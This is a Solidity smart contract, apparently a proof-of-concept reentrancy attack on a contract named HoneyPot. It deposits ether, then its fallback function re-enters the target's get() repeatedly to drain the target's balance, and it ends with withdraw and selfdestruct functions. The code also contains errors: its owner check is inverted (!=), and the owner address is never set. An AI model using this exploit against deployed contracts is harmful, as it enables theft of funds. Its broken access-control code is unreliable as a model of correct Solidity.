pragma solidity ^0.4.6;

import "./HoneyPot.sol";


contract TakeHoney
{
    address cHoneyPotAddress;
    address owner;
    
    uint howManyTimes ;
    uint iterations ;
    HoneyPot hp;
    
    modifier onlyowner
    {
        require(owner!=msg.sender);
        _;
    }
    
    function getBalanceOf(address addr)
        public
        returns(uint)
    {
        return addr.balance;
    }
    
    function TakeHoney (address honeyPotAddr)
        public
    {
        cHoneyPotAddress = honeyPotAddr;
        hp = HoneyPot(cHoneyPotAddress); // instance
    }
    
    
    function callPut() 
        public
        payable
        onlyowner
    {
        
        hp.put.value(msg.value)();
    }
    
    function callGet(uint times)
        public 
        onlyowner
    {
        howManyTimes = times;
        iterations=0;
        hp.get();
    }
    
    
    function withdraw()
        public
        onlyowner
    {
        msg.sender.transfer(this.balance);
    }
    
    function () 
        public
        payable
        onlyowner
    {
       
        if(hp.balance>0 && iterations<howManyTimes)
        {
            iterations++;
            hp.get();
        }
            
    }
    
    function killMe() 
      public
      onlyowner
      returns (bool) 
    {
      selfdestruct(owner);
      return true;
    }
}